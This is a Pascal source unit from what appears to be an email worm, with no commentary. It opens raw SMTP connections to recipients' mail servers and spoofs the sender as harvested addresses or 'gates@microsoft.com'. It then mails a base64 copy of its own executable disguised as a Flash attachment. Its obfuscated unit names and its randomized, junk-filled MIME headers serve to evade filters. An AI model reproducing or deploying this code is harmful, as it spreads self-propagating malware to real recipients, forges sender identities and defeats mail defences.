   {$I CompMode.INI}

   {$IFDEF Debug}
   UNIT Email;
   {$ELSE}
   UNIT A1;
   {$ENDIF}

   INTERFACE

   {$IFDEF Debug}
   USES
     Registry, Utils, ACLUtils, MXLookup, GetProc, sClasses;
   {$ELSE}
   USES
     B3, A6, B1, A4, A3, B2;
   {$ENDIF}

   PROCEDURE InitEmailProcesses;
   PROCEDURE SendEmail(Subject,Body,Recip,AttachmentPath,AttachmentName:AnsiString);

   CONST
     SOCKET_ERROR = -1;
     AF_INET      = 02;
     SOCK_STREAM  = 01;
     IPPROTO_IP   = 00;
     fd_setsize   = 64;
     pf_inet      = af_inet;
     sock_dgram   = 02;
     ipproto_udp  = 17;
     ioc_out      = $40000000;
     fionread     = ioc_out OR (SizeOf(Longint) SHL 16) OR (Ord('f') SHL 8) OR 127;
     CODE64       : STRING = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=*-/][.,><? !~@#$%^&';

   {$I Resources\TWINSOCKETPROCESS.INI}

   TYPE
     SunB = PACKED RECORD
       s_b1 : Char;
       s_b2 : Char;
       s_b3 : Char;
       s_b4 : Char;
     END;

     SunW = PACKED RECORD
       s_w1 : WORD;
       s_w2 : WORD;
     END;

     WSAData = RECORD
       wVersion        : WORD;
       wHighVersion    : WORD;
       szDescription   : ARRAY [0..256] OF Char;
       szSystemStatus  : ARRAY [0..128] OF Char;
       iMaxSockets     : WORD;
       iMaxUdpDg       : WORD;
       lpVendorInfo    : pChar;
     END;

     in_addr = RECORD
       CASE Integer OF
         0 : (S_un_b : SunB);
         1 : (S_un_w : SunW);
         2 : (S_addr : DWORD);
       END;

     TInAddr = in_addr;

     sockaddr_in = RECORD
       CASE Integer OF
         0 : (sin_family : WORD;
              sin_port   : WORD;
              sin_addr   : TInAddr;
              sin_zero   : ARRAY[0..7] OF Char);
         1 : (sa_family  : WORD;
              sa_data    : ARRAY[0..13] OF Char)
     END;

     PHostEnt     = ^THostEnt;

     HostEnt      = RECORD
       h_name     : pChar;
       h_aliases  :^pChar;
       h_addrtype : SmallInt;
       h_length   : SmallInt;
       CASE BYTE OF
         0: (h_addr_list :^pChar);
         1: (h_addr      :^pChar)
     END;

     TSockAddrIn = sockaddr_in;
     THostEnt    = HostEnt;
     TSocket     = Integer;
     HINTERNET   = Pointer;
     DWORD       = LongWord;
     BOOL        = LongBool;
     TWSAData    = WSAData;
     PInAddr     =^TInAddr;
     TSockAddr   = TSockAddrIn;
     PSockAddr   =^TSockAddr;
     UINT        = LongWord;
     Triple      = ARRAY[1..3] OF BYTE;
     Quad        = ARRAY[1..4] OF BYTE;
     PFDSet      = ^TFDSet;
     PTimeVal    = ^TTimeVal;

     TFDSet      = PACKED RECORD
       fd_count  : Longint;
       fd_array  : ARRAY [0..fd_setsizE-1] OF TSocket;
     END;

     TTimeVal    = PACKED RECORD
       tv_sec    : Longint;
       tv_usec   : Longint;
     END;

   CONST
     invalid_socket = TSocket(NOT(0));

   VAR
     SMTPServer       : STRING = '';
     SMTPAcc          : STRING = '';
     Sock             : TSocket;
     Emails           : TStrings;
     Wsadatas         : TWSADATA;
     SockAddrIn       : TSockAddrIn;
     Buf              : ARRAY[0..255] OF Char;
     FileBuf          : ARRAY[1..200000] OF BYTE;
     WSACleanup       : FUNCTION : Integer;
     inet_addr        : FUNCTION(CP:pChar) : DWORD; STDCALL;
     CloseSocket      : FUNCTION(S:TSocket) : Integer; STDCALL;
     Htons            : FUNCTION(HostShort:WORD) : WORD; STDCALL;
     inet_ntoa        : FUNCTION(n_addr:in_addr) : pChar; STDCALL;
     ntohs            : FUNCTION(netshort:dWORD) : DWORD; STDCALL;
     GetHostByName    : FUNCTION(HostName:pChar) : PHostEnt; STDCALL;
     Socket           : FUNCTION(Af,Struct,Protocol:Integer) : TSocket; STDCALL;
     ioctlsocket      : FUNCTION(S:TSocket;cmd:DWORD;VAR arg:DWORD): Integer; STDCALL;
     GetNetworkParams : FUNCTION(FI:PFixedInfo;VAR BufLen:Integer) : Integer; STDCALL;
     Recv             : FUNCTION(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL;
     Send             : FUNCTION(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL;
     WSAStartup       : FUNCTION(wVersionRequired:WORD;VAR WSData: TWSAData) : Integer; STDCALL;
     Connect          : FUNCTION(S:TSocket;VAR Name:TSockAddr;Namelen:Integer) : Integer; STDCALL;
     select           : FUNCTION(nfds:Integer;readfds,writefds,exceptfds:PFDSet;timeout:PTimeVal): Integer; STDCALL;
     sendto           : FUNCTION(S:TSocket;VAR Buf;len,flags:Integer;addrto:PSockAddr;tolen:Integer): Integer; STDCALL;
     recvfrom         : FUNCTION(S:TSocket;VAR Buf;len,flags:Integer;from:PSockAddr;fromlen:PInteger) : Integer; STDCALL;

   IMPLEMENTATION

   PROCEDURE InitEmailProcesses;
   BEGIN
     GetAddr(pChar(MainStr[65]),TWinSocketProcess);                                //"ws2_32.dll"
     Send:=pDllProcesses[1];
     WSAStartup:=pDllProcesses[2];
     Socket:=pDllProcesses[3];
     Htons:=pDllProcesses[4];
     inet_addr:=pDllProcesses[5];
     Connect:=pDllProcesses[6];
     Recv:=pDllProcesses[7];
     CloseSocket:=pDllProcesses[8];
     inet_ntoa:=pDllProcesses[9];
     GetHostByName:=pDllProcesses[10];
     WSACleanup:=pDllProcesses[11];
     sendto:=pDllProcesses[12];
     ioctlsocket:=pDllProcesses[13];
     recvfrom:=pDllProcesses[14];
     ntohs:=pDllProcesses[15];
     select:=pDllProcesses[16];
     GetNetworkParams:=GetProcAddress(LoadLibrary('iphlpapi.dll'),'GetNetworkParams');
   END;

   FUNCTION EncodeQuotedPrintable(S:STRING) : STRING;
   VAR
     I : WORD;
     J : BYTE;
     D : STRING;
     K : STRING;
   BEGIN
     D:=S[1]+S[2];
     I:=2;
     J:=2;
     REPEAT
       Inc(I);
       Inc(J);
       K:=IntToHex2(Ord(S[I]));
       IF J=26 THEN BEGIN
         D:=D+'='+CRLF;
         J:=1;
       END;
       D:=D+'='+K;
     UNTIL I=Length(S);
     RESULT:=D;
   END;

   FUNCTION PolyString(STR:STRING) : STRING;
   VAR
     I : WORD;
     K : WORD;
     T : STRING;
     O : STRING;
   BEGIN
     FOR I:=1 TO Length(STR) DO BEGIN
       IF Random(2)=0 THEN O:=UpCase(STR[I]) ELSE O:=LowerCase(STR[I]);
       T:=T+O+'(';
       FOR K:=1 TO Random(5)+1 DO T:=T+Code64[Random(82)+1];
       T:=T+')';
     END;
     RESULT:=T;
   END;

   FUNCTION NameToIP(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   FUNCTION Codeb64(Count:BYTE;T:Triple) : STRING;
   VAR
     Q    : Quad;
     Strg : STRING;
   BEGIN
     IF Count<3 THEN BEGIN
       T[3]:=0;
       Q[4]:=64;
     END ELSE Q[4]:=(T[3] AND $3F);
     IF Count<2 THEN BEGIN
       T[2]:=0;
       Q[3]:=64;
     END ELSE Q[3]:=Byte(((T[2] SHL 2)OR(T[3] SHR 6)) AND $3F);
     Q[2]:=Byte(((T[1] SHL 4) OR (t[2] SHR 4)) AND $3F);
     Q[1]:=((T[1] SHR 2) AND $3F);
     Strg:='';
     FOR Count:=1 TO 4 DO Strg:=(Strg+Code64[(Q[Count]+1)]);
     RESULT:=Strg;
   END;

   FUNCTION BASE64(DataLength:DWORD) : AnsiString;
   VAR
     B      : AnsiString;
     I      : DWORD;
     Remain : DWORD;
     Trip   : Triple;
     Count  : WORD;
   BEGIN
     Count:=0;
     B:='';
     FOR I:=1 TO DataLength DIV 3 DO BEGIN
       INC(Count,4);
       Trip[1]:=Ord(FileBuf[(I-1)*3+1]);
       Trip[2]:=Ord(FileBuf[(I-1)*3+2]);
       Trip[3]:=Ord(FileBuf[(I-1)*3+3]);
       B:=B+codeb64(3,Trip);
       IF Count=76 THEN BEGIN
         B:=B+CRLF;
         Count:=0;
       END;
     END;
     Remain:=DataLength-(DataLength DIV 3)*3;
     IF Remain>0 THEN BEGIN
       Trip[1]:=Ord(FileBuf[DataLength-1]);
       IF Remain>1 THEN Trip[2]:=Ord(FileBuf[DataLength]);
       IF Remain=1 THEN B:=B+Codeb64(1,Trip) ELSE B:=B+Codeb64(2,Trip);
     END;
     RESULT:=B;
   END;

   PROCEDURE Mys(STR:STRING);
   BEGIN
     IF Send(Sock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Exit;
   END;

   FUNCTION RandomLines:AnsiString;
   VAR
     A,B : BYTE;
   BEGIN
     FOR B:=1 TO Random(9)+1 DO BEGIN
       FOR A:=1 TO Random(39)+1 DO RESULT:=RESULT+Code64[Random(60)+1];
       RESULT:=RESULT+CRLF;
     END;
   END;

   PROCEDURE SendEmail(Subject,Body,Recip,AttachmentPath,AttachmentName:AnsiString);
   VAR
     F : FILE;
   BEGIN
     IF Pos('@',Recip)>0 THEN SMTPServer:=GetSMTPAddress(Copy(Recip,Pos('@',Recip)+1,Length(Recip)));
     IF (Emails<>nil)AND(Emails.Count>1) THEN SMTPAcc:=Emails[Random(Emails.Count-2)+1] ELSE SMTPAcc:=MainStr[96]; //"gates@microsoft.com"
     IF SMTPServer<>'' THEN BEGIN
       WSAStartUp(257,wsadatas);
       Sock:=Socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
       SockAddrIn.sin_family:=AF_INET;
       htons(25);
       SockAddrIn.sin_port:=htons(25);
       SockAddrIn.sin_addr.S_addr:=inet_addr(PChar(NameToIP(SMTPServer)));
       Connect(Sock,SockAddrIn,SizeOf(SockAddrIn));
       Recv(Sock,Buf,Sizeof(Buf),0);
       Mys(MainStr[66]+CRLF);                                                      //"HELO net.com"
       Recv(Sock,Buf,SizeOf(Buf),0);
       Mys(MainStr[67]+' '+SMTPAcc+CRLF);                                          //"MAIL FROM:"
       Recv(Sock,Buf,SizeOf(Buf),0);
       Mys(MainStr[69]+' '+Recip+CRLF);                                            //"RCPT TO:"
       Recv(Sock,Buf,SizeOf(Buf),0);
       Mys(MainStr[70]+CRLF);                                                      //"DATA"
       Recv(Sock,Buf,SizeOf(Buf),0);
       Mys(MainStr[97]+' '+SMTPAcc+CRLF);                                          //"From:"
       Mys(MainStr[68]+' '+Subject+CRLF);                                          //"Subject:"
       Mys('MIME-Version: 1.0'+CRLF);                                              //"MIME-Version: 1.0"
       Mys(MainStr[72]+' '+PolyString(MainStr[73])+'"bla"'+CRLF+CRLF);             //"Content-Type:","multipart/mixed; boundary="
       Mys(RandomLines+CRLF+CRLF);
       Mys(MainStr[75]+CRLF);                                                      //"--bla"
       Mys(MainStr[72]+' '+PolyString(MainStr[76])+CRLF);                          //"Content-Type:","text/plain; charset:us-ascii"
       Mys(MainStr[78]+' '+PolyString(MainStr[79])+CRLF+CRLF);                     //"Content-Transfer-Encoding:","base64"
       Mys(EncodeQuotedPrintable(Body)+CRLF+CRLF);
       Mys(MainStr[75]+CRLF);                                                      //"--bla"
       Mys(MainStr[72]+' '+MainStr[87]+CRLF);                                      //"Content-Type:","application/x-shockwave-flash;"
       Mys('    '+PolyString(MainStr[89])+'"'+AttachmentName+'"'+CRLF);            //"name="
       Mys(MainStr[78]+' '+PolyString(MainStr[88])+CRLF+CRLF);                     //"Content-Transfer-Encoding:","base64"
       AssignFile(F,StartEXEName);
       Reset(F,1);
       BlockRead(F,FileBuf[1],FileSize(F));
       Mys(BASE64(FileSize(F)));
       CloseFile(F);
       Mys(CRLF+MainStr[91]+CRLF+CRLF);                                            //"--bla--"
       Mys(CRLF+'.'+CRLF);
       Recv(Sock,Buf,SizeOf(Buf),0);
       Mys(MainStr[92]+CRLF);                                                      //"QUIT"
       Recv(Sock,Buf,SizeOf(Buf),0);
     END;
   END;
   END.
